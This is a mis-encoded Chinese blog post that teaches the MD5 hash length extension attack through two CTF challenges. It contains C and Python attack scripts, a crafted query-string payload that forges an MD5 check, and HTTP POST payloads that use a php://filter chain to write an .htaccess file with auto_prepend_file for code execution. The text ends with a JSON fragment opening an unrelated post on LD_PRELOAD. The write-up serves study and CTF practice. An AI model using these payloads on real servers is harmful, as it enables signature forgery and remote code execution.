#\rå¯èƒ½æˆ‘ç°åœ¨å†™çš„ä¸œè¥¿æœ‰ç‚¹æŠ½è±¡ï¼Œä¸è¿‡åé¢æˆ‘ä¼šæ€»ç»“è®²ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšä»¥åŠä»–çš„åŸç† è¿™é‡Œå®šä¹‰ä¸€äº›ä¸œè¥¿\nletÂ secret = \u0026quot;secret\u0026quot; letÂ data = \u0026quot;data\u0026quot; letÂ H = md5() letÂ signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b letÂ append = \u0026quot;append\u0026quot; é¦–å…ˆè¿™é‡Œæ”¾å‡ºä¸€ä¸ªç®€å•çš„example\n0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata...... 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ........P....... ä»£ç æ¨¡å¼å¯èƒ½çœ‹çš„ä¸æ˜¯å¾ˆæ¸…æ™°ï¼Œè¿™é‡Œæˆ‘è´´å‡ºæ¥å›¾ç‰‡ å½“ç„¶è¿™é‡Œæ˜¯åˆ©ç”¨16è¿›åˆ¶æ¥è¡¨ç¤ºçš„ï¼Œæˆ‘ä»¬ç”¨äºŒè¿›åˆ¶ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œ8-\u0026gt;1ï¼Œ5-\u0026gt;8bitã€‚\nATTACK #\rè¿™é‡Œæˆ‘ä»¬å°†ä¸€ä¸ªå€¼ï¼Œå°±æ˜¯å‰é¢çš„appendåŠ å…¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œæ˜¯è¿™æ ·çš„ æ­¤æ—¶ï¼Œè¿™ä¸ªå“ˆå¸Œå€¼æœ‰ä¸¤ç§è®¡ç®—æ–¹å¼ï¼ˆç ´é¢˜ç‚¹ï¼Œè¿™ä¸ªåé¢ä¼šå¥½å¥½è§£é‡Šä¸€ä¸‹å¯èƒ½è¿™é‡Œæ¯”è¾ƒæŠ½è±¡ï¼‰\né€šè¿‡å°†å…¶ç²˜è´´åœ¨ç¼“å†²åŒºä¸­å¹¶æ‰§è¡ŒH(buffer) ä»ç¬¬ä¸€ä¸ªå—çš„æœ«å°¾å¼€å§‹ï¼Œä½¿ç”¨æˆ‘ä»¬å·²ç»çŸ¥é“çš„çŠ¶æ€signatureï¼Œå¹¶appendä»è¯¥çŠ¶æ€å¼€å§‹è¿›è¡Œæ•£åˆ— å¯¹äºä¸€ç§ï¼ˆä¹Ÿæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„è®¡ç®—è¿‡ç¨‹ï¼‰ #\rå…¶å®å°±æ˜¯æŒ‰ç…§æ­£å¸¸çš„ç”Ÿæˆhashå€¼çš„è¿‡ç¨‹ï¼Œæœ€åç”Ÿæˆå‡ºæ¥çš„å“ˆå¸Œå€¼è¯·æˆ‘ä»¬è¿™é‡Œæš‚å®šä¸ºï¼š 6ee582a1669ce442f3719c47430dadee è¿™é‡Œè´´å‡ºä¸€ä¸‹ç”Ÿæˆå…¶md5çš„ä¸€ä¸ªè„šæœ¬\necho \u0026#39; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; int main(int argc, const char *argv[]) { MD5_CTX c; unsigned char buffer[MD5_DIGEST_LENGTH]; int i; MD5_Init(\u0026amp;c); MD5_Update(\u0026amp;c, \u0026#34;secret\u0026#34;, 6); MD5_Update(\u0026amp;c, \u0026#34;data\u0026#34; \u0026#34;\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;append\u0026#34;, 64); MD5_Final(buffer, \u0026amp;c); for (i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x\u0026#34;, buffer[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; }\u0026#39; \u0026gt; hash_extension_1.c gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto ./hash_extension_1 å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ç­¾åå°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„æ•°æ®ã€‚\nç¬¬äºŒç§ï¼ˆä¹Ÿå°±æ˜¯æ”»å‡»è€…ï¼‰ #\rè¿™é‡Œæˆ‘ç›´æ¥è´´è„šæœ¬å‡ºæ¥\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; int main(int argc, const char *argv[]) { int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(\u0026amp;c); MD5_Update(\u0026amp;c, \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34;, 64); c.A = htonl(0x6036708e); /* \u0026lt;-- This is the hash we already had */ c.B = htonl(0xba0d11f6); c.C = htonl(0xef52ad44); c.D = htonl(0xe8b74d5b); MD5_Update(\u0026amp;c, \u0026#34;append\u0026#34;, 6); /* This is the appended data. */ MD5_Final(buffer, \u0026amp;c); for (i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x\u0026#34;, buffer[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; }\u0026#39; \u0026gt; hash_extension_2.c gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto ./hash_extension_2 å¯ä»¥çœ‹è§æˆ‘ä»¬è¿™é‡Œå¯¹å››ä¸ªå¹»æ•°ï¼ˆå‰é¢çš„ç†è®ºæœ‰è®²åˆ°ï¼‰ï¼Œä½œä¸ºäº†ä¸€ä¸ªåˆå§‹å‚æ•° letÂ signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b æ¥è¿›è¡Œmd5å€¼çš„åŠ å¯†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†AAAAé‚£ç¾¤æ•°æ®å—å¯¹å…¶è¿›è¡Œäº†å†æ¬¡çš„å¤šè½®å‹ç¼©ç¯èŠ‚ã€‚ æœ€åç”Ÿæˆå‡ºæ¥çš„å“ˆå¸Œå€¼ 6ee582a1669ce442f3719c47430dadee\nå…¶å®åˆ°æ­¤ä¸ºæ­¢ï¼Œè¿™ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚ä½†æ˜¯è¿™é‡Œè¦è¯´ä¸€ä¸‹ï¼Œæ”¾åœ¨ç†è®ºä¸Šæ˜¯æ¯”è¾ƒéš¾ç†è§£çš„ï¼Œè¿™é‡Œè¿˜æ˜¯éœ€è¦ä¸¾ä¾‹å­å¯ä»¥æ›´åŠ ç›´è§‚çš„ç†è§£ï¼ˆå…¶å®åœ¨é¢˜ç›®ä¸­çš„æœ¬è´¨å°±æ˜¯å°†æœ€åé¢çš„å¤šè½®å‹ç¼©å†å¯¹ä½ å¯æ§çš„appendè¿›è¡Œä¸€æ¬¡å‹ç¼©ä»è€Œä½ å¯ä»¥çŸ¥é“åé¢ç”Ÿæˆçš„MD5å€¼æ˜¯ä»€ä¹ˆï¼‰\nDEMO1 #\r\u0026lt;?php error_reporting(0); $flag=getenv(\u0026#34;DASFLAG\u0026#34;); if(isset($_GET[\u0026#34;md5\u0026#34;]) \u0026amp;\u0026amp; isset($_GET[\u0026#34;i\u0026#34;]) \u0026amp;\u0026amp; isset($_GET[\u0026#34;s\u0026#34;])){ $fl4g = substr_replace($flag, $_GET[\u0026#34;s\u0026#34;], $_GET[\u0026#34;i\u0026#34;], 1); if($_GET[\u0026#34;md5\u0026#34;] === md5($fl4g)){ echo $flag; }else{ die(\u0026#34;please try again\u0026#34;); } }else{ highlight_file(__FILE__); echo md5($flag.\u0026#34;yusa\u0026#34;); } 1c3de59d2f68788cc792e0eb7d604710 è¿™é‡Œç›´æ¥æ”¾å‡ºplayloadï¼š ?md5=d9671633e3723203bc2a1479c8412307\u0026amp;i=-1\u0026amp;s=}yusa%80%00%00%00%00%00%00%00%00%00%00%00%00%00%50%01%00%00%00%00%00%00a è¿™é‡Œæˆ‘åˆ©ç”¨å‰é¢çš„çš„è®²çš„ATTACKæ¥è¿›è¡Œè®²è§£:\nä¾‹å¦‚æˆ‘ä»¬çš„flagå€¼æ˜¯DT{axsak1dlsajl1} é‚£ä¹ˆæ­¤æ—¶çš„16è¿›åˆ¶å°±æ˜¯è¿™æ ·çš„ ç„¶ååœ¨åŠ äº†saltä¹‹åå°±æ˜¯åŠ å…¥yusaåå°±æ˜¯ æ­¤æ—¶çš„åŸå§‹æ•°æ®é•¿åº¦å°±æ˜¯21*8=168bitï¼Œè½¬åŒ–ä¸º16è¿›åˆ¶å°±æ˜¯a8 å¡«å……åå°±æ˜¯è¿™æ · é‚£ä¹ˆè¿›è¡Œå¤šè½®å‹ç¼©çš„æ—¶å€™å°±æ˜¯å°†å…¶ä½œä¸ºä¸€ä¸ªæ•°æ®å—è¿›è¡Œå‹ç¼©ã€‚ è¿™é‡Œæˆ‘ç›´æ¥è´´å‡ºæ¥md5å€¼ä¸ºï¼š 2b604a43f439b6e02c09dece6a83e503 è¿™ä¸ªæ˜¯æˆ‘ä»¬å·²çŸ¥çš„ï¼Œåé¢ç”¨\n\\[YZ\\]è¡¨ç¤º\næ„é€  #\rè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸‹æˆ‘ä»¬çš„playloadä»€ä¹ˆçš„äº† æˆ‘ä»¬çœ‹åˆ°é¢˜ç›® $fl4g = substr_replace($flag, $_GET[\u0026quot;s\u0026quot;], $_GET[\u0026quot;i\u0026quot;], 1); æ˜¯å¯¹åŸæœ¬çš„flagè¿›è¡Œäº†æ›¿æ¢ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å¯ä»¥æƒ³æƒ³ï¼Œå› ä¸ºè¿™ä¸ªé¢˜ç›®åªèƒ½æ›¿æ¢æ‰ä¸€ä¸ªé•¿åº¦ï¼Œé‚£ä¹ˆå¯¹äºå®šä¹‰ï¼Œåœ¨å‰é¢çš„æ•°æ®å—ä¸­æˆ‘ä»¬å·²ç»çŸ¥é“äº†å…¶md5å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ›¿æ¢åæ·»åŠ åˆ°ä¸‹ä¸€ä¸ªæ•°æ®å—è®©ä»–å†æ¬¡è¿›è¡Œå‹ç¼©ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±çŸ¥é“ä»–çš„ä¸‹ä¸€ä¸ªæ„é€ å‡ºæ¥çš„md5æ˜¯ä»€ä¹ˆäº† è¿‡ç¨‹ï¼š è¿™ä¸ªæ˜¯å®Œæ•´çš„ä¸€ä¸ªæ•°æ®å—ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å¦‚æœæ›¿æ¢å®ŒåæŠŠä»–å˜ä¸º è¿™æ ·ä¹‹åé‚£ä¹ˆæ˜¯ä¸æ˜¯åœ¨æœåŠ¡ç«¯å°±ä¼šå†æ¬¡å¯¹å…¶è¿›è¡Œå¡«å……å’Œå¤šè½®å‹ç¼©ï¼Œä¹Ÿå°±æ˜¯è¿™æ · ï¼ˆè¿™é‡Œçš„A7æ˜¯æˆ‘éšä¾¿å†™çš„ï¼Œå› ä¸ºæ‡’å¾—ç®—å‰é¢çš„é•¿åº¦å†è½¬æ¢äº†ï¼‰ è¿™é‡Œæ­¤æ—¶æ˜¯ä¸æ˜¯ç¬¬äºŒä¸ªåˆ†å—å‹ç¼©å°±ä¼šåˆ©ç”¨åŒ…å«aåœ¨çš„æ•°æ®å—å†æ¬¡å¯¹æ•°æ®è¿›è¡Œå‹ç¼©ï¼Œæ­¤æ—¶ç”Ÿæˆå‡ºæ¥çš„md5å€¼å°±å’Œæˆ‘ä»¬éœ€è¦çš„md5å€¼ä¾¿ä¸€æ ·äº†ï¼Œ è¿™é‡Œéšä¾¿ä¸¾ä¸€ä¸ªä¾‹å­ï¼šæˆ‘ä»¬ç”Ÿæˆçš„md5æ˜¯d9671633e3723203bc2a1479c8412307 é‚£ä¹ˆæ˜¾è€Œæ˜“è§ï¼Œåœ¨æœåŠ¡ç«¯ç”Ÿæˆçš„md5å€¼ä¹Ÿå°±ä¸€å®šæ˜¯è¿™ä¸ªä¹Ÿå°±ç»•è¿‡äº† $_GET[\u0026quot;md5\u0026quot;] === md5($fl4g)çš„é™åˆ¶äº†\ndemo1å°æ€»ç»“ #\ræ€»çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„çœ‹å‡ºæ¥ï¼Œå…¶å®å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºå’ŒåŸæœ¬æ•°æ®ä¸€æ ·çš„æ•°æ®å—ä¹‹åè‡ªå·±è¡¥åˆ°ä¸‹ä¸€ä¸ªæ•°æ®å—å†…å®¹æ¥è¿›è¡Œè·å¾—md5çš„åŠ å¯†å€¼,ä¹Ÿå°±æ˜¯å°†æˆ‘ä»¬çš„YZæ”¾åˆ°ä¸Šé¢ATTACK-\u0026gt;ç¬¬äºŒç§ä¸‹é¢çš„è„šæœ¬æ¥è¿›è¡Œè·å¾—md5å€¼çš„è¿‡ç¨‹\nè¿™ä¸ªdemo1åé¢å†æ”¾å‡ºä¸€ä¸ªpyè„šæœ¬\n# -*- coding: utf-8 -*- # @Author: King kaki # @Date: 2018-08-04 12:40:11 # @Last Modified by: kingkk # @Last Modified time: 2018-08-12 15:08:28 import math F = lambda x, y, z: ((x \u0026amp; y) | ((~x) \u0026amp; z)) G = lambda x, y, z: ((x \u0026amp; z) | (y \u0026amp; (~z))) H = lambda x, y, z: (x ^ y ^ z) I = lambda x, y, z: (y ^ (x | (~z))) L = lambda x, n: (((x \u0026lt;\u0026lt; n) | (x \u0026gt;\u0026gt; (32 - n))) \u0026amp; (0xffffffff)) shi_1 = (7, 12, 17, 22) * 4 shi_2 = (5, 9, 14, 20) * 4 shi_3 = (4, 11, 16, 23) * 4 shi_4 = (6, 10, 15, 21) * 4 m_1 = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) m_2 = (1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12) m_3 = (5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2) m_4 = (0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9) def T(i): return (int(4294967296 * abs(math.sin(i)))) \u0026amp; 0xffffffff def shift(shift_list): shift_list = [shift_list[3], shift_list[0], shift_list[1], shift_list[2]] return shift_list def fun(fun_list, f, m, shi): count = 0 global Ti_count while count \u0026lt; 16: xx = int(fun_list[0], 16) + f(int(fun_list[1], 16), int(fun_list[2], 16), int(fun_list[3], 16)) + int(m[count], 16) + T(Ti_count) xx \u0026amp;= 0xffffffff ll = L(xx, shi[count]) fun_list[0] = hex((int(fun_list[1], 16) + ll) \u0026amp; 0xffffffff) fun_list = shift(fun_list) count += 1 Ti_count += 1 return fun_list def gen_m16(order, ascii_list, f_offset): ii = 0 m16 = [0] * 16 f_offset *= 64 for i in order: i *= 4 m16[ii] = \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join((ascii_list[i + f_offset] + ascii_list[i + 1 + f_offset] + ascii_list[i + 2 + f_offset] + ascii_list[i + 3 + f_offset]).split(\u0026#39;0x\u0026#39;)) ii += 1 for ind in range(len(m16)): m16[ind] = reverse_hex(m16[ind]) return m16 def reverse_hex(hex_str): hex_str = hex_str[2:] if len(hex_str) \u0026lt; 8: hex_str = \u0026#39;0\u0026#39; * (8 - len(hex_str)) + hex_str hex_str_list = [] for i in range(0, len(hex_str), 2): hex_str_list.append(hex_str[i:i + 2]) hex_str_list.reverse() hex_str_result = \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join(hex_str_list) return hex_str_result def show_result(f_list): result = \u0026#39;\u0026#39; f_list1 = [0] * 4 for i in f_list: f_list1[f_list.index(i)] = reverse_hex(i)[2:] result += f_list1[f_list.index(i)] return result def padding(input_m, msg_lenth=0): ascii_list = list(map(hex, map(ord, input_m))) msg_lenth += len(ascii_list) * 8 ascii_list.append(\u0026#39;0x80\u0026#39;) for i in range(len(ascii_list)): if len(ascii_list[i]) \u0026lt; 4: ascii_list[i] = \u0026#39;0x\u0026#39; + \u0026#39;0\u0026#39; + ascii_list[i][2:] while (len(ascii_list) * 8 + 64) % 512 != 0: ascii_list.append(\u0026#39;0x00\u0026#39;) msg_lenth_0x = hex(msg_lenth)[2:] msg_lenth_0x = \u0026#39;0x\u0026#39; + msg_lenth_0x.rjust(16, \u0026#39;0\u0026#39;) msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[2:] msg_lenth_0x_list = [] for i in range(0, len(msg_lenth_0x_big_order), 2): msg_lenth_0x_list.append(\u0026#39;0x\u0026#39; + msg_lenth_0x_big_order[i: i + 2]) ascii_list.extend(msg_lenth_0x_list) return ascii_list def md5(input_m): global Ti_count Ti_count = 1 abcd_list = [\u0026#39;0x67452301\u0026#39;, \u0026#39;0xefcdab89\u0026#39;, \u0026#39;0x98badcfe\u0026#39;, \u0026#39;0x10325476\u0026#39;] ascii_list = padding(input_m) for i in range(0, len(ascii_list) // 64): aa, bb, cc, dd = abcd_list order_1 = gen_m16(m_1, ascii_list, i) order_2 = gen_m16(m_2, ascii_list, i) order_3 = gen_m16(m_3, ascii_list, i) order_4 = gen_m16(m_4, ascii_list, i) abcd_list = fun(abcd_list, F, order_1, shi_1) abcd_list = fun(abcd_list, G, order_2, shi_2) abcd_list = fun(abcd_list, H, order_3, shi_3) abcd_list = fun(abcd_list, I, order_4, shi_4) output_a = hex((int(abcd_list[0], 16) + int(aa, 16)) \u0026amp; 0xffffffff) output_b = hex((int(abcd_list[1], 16) + int(bb, 16)) \u0026amp; 0xffffffff) output_c = hex((int(abcd_list[2], 16) + int(cc, 16)) \u0026amp; 0xffffffff) output_d = hex((int(abcd_list[3], 16) + int(dd, 16)) \u0026amp; 0xffffffff) abcd_list = [output_a, output_b, output_c, output_d] Ti_count = 1 print(ascii_list) return show_result(abcd_list) # md5-Length Extension Attack: è®¡ç®— md5(message + padding + suffix), res = md5(message), len_m = len(message) def md5_lea(suffix, res, len_m): global Ti_count Ti_count = 1 abcd_list = [] for i in range(0, 32, 8): abcd_list.append(reverse_hex(\u0026#39;0x\u0026#39; + res[i: i + 8])) # print(abcd_list) ascii_list = padding(suffix, (len_m + 72) // 64 * 64 * 8) # len(message + padding) * 8 # print(ascii_list) for i in range(0, len(ascii_list) // 64): aa, bb, cc, dd = abcd_list order_1 = gen_m16(m_1, ascii_list, i) order_2 = gen_m16(m_2, ascii_list, i) order_3 = gen_m16(m_3, ascii_list, i) order_4 = gen_m16(m_4, ascii_list, i) abcd_list = fun(abcd_list, F, order_1, shi_1) abcd_list = fun(abcd_list, G, order_2, shi_2) abcd_list = fun(abcd_list, H, order_3, shi_3) abcd_list = fun(abcd_list, I, order_4, shi_4) output_a = hex((int(abcd_list[0], 16) + int(aa, 16)) \u0026amp; 0xffffffff) output_b = hex((int(abcd_list[1], 16) + int(bb, 16)) \u0026amp; 0xffffffff) output_c = hex((int(abcd_list[2], 16) + int(cc, 16)) \u0026amp; 0xffffffff) output_d = hex((int(abcd_list[3], 16) + int(dd, 16)) \u0026amp; 0xffffffff) abcd_list = [output_a, output_b, output_c, output_d] Ti_count = 1 # print(ascii_list) return show_result(abcd_list) def url_append(hex_bit): len_append = \u0026#39;0x{}{}\u0026#39;.format( (18-len(hex_bit))*\u0026#39;0\u0026#39;, hex_bit[2:]) len_append = reverse_hex(len_append)[2:] # print(len_append) t = \u0026#39;\u0026#39; for i in range(len(len_append)): if i % 2 ==0 : t += \u0026#39;%\u0026#39;+len_append[i:i+2] else: pass return t if __name__ == \u0026#39;__main__\u0026#39;: \u0026#39;\u0026#39;\u0026#39; ä¿®æ”¹resä¸ºå·²çŸ¥å“ˆå¸Œå€¼ extend ä¸ºæ‹“å±•å€¼ è‡ªåŠ¨éå†å‡º1-30é•¿åº¦çš„payload urlç¼–ç è¡¨è¾¾å¼ \u0026#39;\u0026#39;\u0026#39; res = \u0026#39;1c3de59d2f68788cc792e0eb7d604710\u0026#39; extend = \u0026#39;}\u0026#39; # print(reverse_hex(\u0026#39;0x\u0026#39; + res)) for i in range(45): hex_bit = hex(i*8) t = url_append(hex_bit) print(\u0026#39;[%d]\u0026#39; % i,md5_lea(extend,res,i)) # print(\u0026#39;{}%80{}{}{}\u0026#39;.format(\u0026#39;X\u0026#39;*i, (55-i)*\u0026#39;%00\u0026#39;,t, extend) ) print(\u0026#39;%80{}{}{}\u0026#39;.format((55-i)*\u0026#39;%00\u0026#39;,t, extend) ) # print(\u0026#39;{}{}\u0026#39;.format( hex(i), (18-len(hex(i)))*\u0026#39;0\u0026#39;) ) # from urllib.parse import unquote # print(md5_lea(\u0026#39;kingkk\u0026#39;,\u0026#39;571580b26c65f306376d4f64e53cb5c7\u0026#39;,10)) DEMO2 #\rè¿™ä¸ªæ˜¯kengwangå¸ˆå‚…å‡ºçš„ä¸€é“é¢˜ç›®\n\u0026lt;?php highlight_file(__FILE__); include \u0026#39;secret.php\u0026#39;; $input = base64_decode($_REQUEST[\u0026#39;content\u0026#39;]); $userhash = $_REQUEST[\u0026#39;hash\u0026#39;]; $content = $secret . $input; if (md5($secret) !== \u0026#39;37870febc8d470109a867802b8031454\u0026#39;) { exit(\u0026#34;No no, Don\u0026#39;t change the secret.\u0026#34;); } echo \u0026#34;Secret\u0026#39;s length is \u0026#34; . strlen($secret) . \u0026#34; \u0026#34;; $hash = md5($content); // Is that enough? Let\u0026#39;s see... if (strlen($userhash) == 32 \u0026amp;\u0026amp; $hash === $userhash) { echo \u0026#34;Congratulations! I will write your input into file.\u0026#34;; $filename = explode(\u0026#34;[[\u0026#34;, $input)[1]; // take it easy, i will change the return for you $filename = str_replace(\u0026#34;\\\\n\u0026#34;, \u0026#34;\\n\u0026#34;, str_replace(\u0026#34;\\0\u0026#34;,\u0026#39;\u0026#39;,$filename)); $content = $secret . $filename; file_put_contents($filename, $content); } else { exit(\u0026#34;Think Extensively.\u0026#34;); } è¿™é‡ŒåŒæ ·ä¹Ÿç»™å‡ºäº†åŠ å¯†å‰çš„secretçš„md5å€¼ï¼Œæˆ‘ä»¬è¿™é‡Œå°±å½“åšdataä¹Ÿå°±æ˜¯demo1çš„yusaæ˜¯ç©ºå€¼å³å¯ã€‚ å½“ç„¶å› ä¸ºè¿™é‡ŒåŠ å…¥äº†æ­»äº¡æ‚ç³…çš„å†…å®¹æ‰€ä»¥è¿™é‡Œæˆ‘æ”¾å‡ºwpï¼Œå…¶å®æ€»çš„æ¥è¯´è¿˜æ˜¯ä¸Šé¢åˆ†æçš„æ–¹æ³•ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ hash_extender è¿™ä¸ªå·¥å…·æ¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡», ç”Ÿæˆæ–°çš„å¯†æ–‡\né¦–å…ˆè€ƒè™‘å°†secretå†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­\næ‰§è¡Œ:\nhash_extender -s 37870febc8d470109a867802b8031454 -a \u0026#34;[[a.txt\u0026#34; -f md5 -l 13 -d \u0026#39;\u0026#39; å¾—åˆ°:\nType: md5 Secret length: 13 New signature: 4f150e4b71070951112f56be4044c181 New string: 8000000000000000000000000000000000000000000000000000000000000000000000000000000000000068000000000000005b5b612e747874 å¯èƒ½éœ€è¦ç”¨ CyberChef å¥— From Hex (Auto) - To Base64\nå‘é€:\nPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: dino-ctf.kengwang.com.cn:32857 hash=4f150e4b71070951112f56be4044c181\u0026amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAAAAAAW1thLnR4dA è®¿é—® a.txt\nå‘ç°secretæ˜¯\u0026lt;?php die(); , æ¥ä¸‹æ¥æ˜¯æ­»äº¡ die ç»•è¿‡\nè¿™é‡Œéœ€è¦ç”¨åˆ°ä¼ªåè®®çš„ä¸€äº›æŠ€å·§:\né¦–å…ˆåˆ©ç”¨ string.strip_tags çš„è¿‡æ»¤å™¨é“¾åæ‰ä¹‹å‰çš„æ­»äº¡ die, ç„¶åå†åœ¨åé¢æ¥ä¸Šä½ æƒ³è¦å†™çš„å†…å®¹\nè¿™é‡Œä½¿ç”¨å†™ .htaccess çš„æ–¹æ³•æ¥å®ç°rce, ç›´æ¥åŠ ä¸ª auto_prepend_file å³å¯\næ„é€ å‡º php://filter/write=string.strip_tags/?\u0026gt;php_value auto_prepend_file flag\\n#/resource=.htaccess\nhash_extender -s 37870febc8d470109a867802b8031454 -a \u0026#34;[[php://filter/write=string.strip_tags/?\u0026gt;php_value auto_prepend_file flag\\n#/resource=.htaccess\u0026#34; -f md5 -l 13 -d \u0026#39;\u0026#39; æœ€ç»ˆ payload:\nPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: 127.0.0.1:32768 hash=473640a1e1ec5efa6bdaf4c7c8f04482\u0026amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAAAAAAW1twaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnN0cmlwX3RhZ3MvPz5waHBfdmFsdWUgYXV0b19wcmVwZW5kX2ZpbGUgZmxhZ1xuIy9yZXNvdXJjZT0uaHRhY2Nlc3M å³å¯å†™å…¥\nConclusion #\ræ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªæ”»å‡»æ–¹æ³•è¿˜æ˜¯å¾ˆå¥½ç©çš„ï¼Œåªä¸è¿‡å‘ç°å¸‚é¢ä¸Šå¾ˆå¤šçš„æ–‡ç« å†™çš„ä¸å°½äººæ„ï¼Œçœ‹äº†ä¸€å¤©éƒ½å¯èƒ½ä¸æ˜ç™½å…¶ä¸­çš„åŸç†ï¼Œå†™çš„è¿‡äºæŠ½è±¡æ‰€ä»¥æƒ³ç€å†™å†™ã€‚ åªè¦æˆ‘ä»¬æ³¨æ„åˆ°MD5ä¸­åŠ å¯†è¿‡ç¨‹ä¸­çš„å¡«å……å’Œå¤šè½®å‹ç¼©ï¼Œå¹¶ä¸”åˆ©ç”¨å³å¯ï¼Œå½“ç„¶ä¹Ÿæœ‰å¾ˆå¤šå·¥å…·å¯ä»¥ç”Ÿæˆä¸€äº›playloadï¼Œè¿™ä¸ªå°±ä¸æ”¾å‡ºæ¥äº†ã€‚ æœ€åæ„Ÿè°¢kengwangå¸ˆå‚…ï¼Œx1r0zå¸ˆå‚…çš„æŒ‡å¯¼\nå‚è€ƒæ–‡ç« ï¼š 1ã€ https://xz.aliyun.com/t/10602 2ã€ https://github.com/iagox86/hash_extender\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/","section":"Posts","summary":"","title":"æ·±å…¥æµ…å‡º-Hashé•¿åº¦æ‹“å±•æ”»å‡»","type":"posts"},{"content":"0x0få‰è¨€ #\ræœ€è¿‘ä¹Ÿæ˜¯æ‰“äº†ä¸€äº›æ¯”èµ›ï¼Œåœ¨VNCTFä¸­çœ‹è§äº†è¿™ä¸ªLD_PRELOADäºæ˜¯æ¥å­¦ä¹ ä¸€ä¸‹ï¼ˆä¼¼ä¹pç¥çš„æ–‡ç« ä¹Ÿæ˜¯æœ‰å†™çš„ï¼‰è¿™é‡Œç»“åˆäº†å¾ˆå¤šç¯‡æ–‡ç« ï¼ˆæ¯”èµ›é¢‘ç‡å¾—é™ä½ä¸€ç‚¹ä¸ç„¶å¤©å¤©éƒ½åœ¨æ‰“æ¯”èµ›æ²¡æ—¶é—´ç ”ç©¶ä¸œè¥¿äº†ï¼‰ ä¹Ÿæ˜¯å¥½ä¹…ä¹Ÿæ²¡æœ‰æ›´æ–°åšå®¢äº†ã€‚\n0x01åŸºç¡€çŸ¥è¯† #\rwhat is LD_PRELOAD #\rLD_PRELOADæ˜¯Linux/Unixç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸åœ¨ç¨‹åºè¿è¡Œå‰å®šä¹‰ä¼˜å…ˆåŠ 